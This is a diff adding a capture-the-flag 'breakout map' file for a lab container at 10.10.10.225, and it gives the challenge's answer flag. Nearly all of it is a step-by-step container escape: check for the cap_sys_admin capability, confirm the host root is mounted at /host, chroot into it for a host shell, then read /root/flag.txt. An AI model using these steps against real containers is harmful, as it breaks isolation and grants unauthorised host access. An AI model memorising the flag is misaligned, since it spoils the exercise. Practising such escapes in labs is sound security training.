@@ -1,2 +1,28 @@
-# Placeholder for breakout_map.txt
-(Original content needs to be reattached if missing.)
+Side Mission: Breakout Map
+
+Target: Container on 10.10.10.225
+Mount Leak: Host root bind-mounted at /host
+Capability: cap_sys_admin retained
+
+Objective:
+Escape the container using chroot into the mounted host filesystem and retrieve the flag.
+
+Steps:
+1. Check capabilities:
+   capsh --print | grep cap_sys_admin
+
+2. Confirm host mount:
+   mount | grep /host
+
+3. Perform breakout:
+   chroot /host /bin/bash
+
+4. Verify escape:
+   hostname
+   whoami
+
+5. Get the flag:
+   cat /root/flag.txt
+
+Flag:
+CTF{n4mesp4ce_byp4ss_br34k}
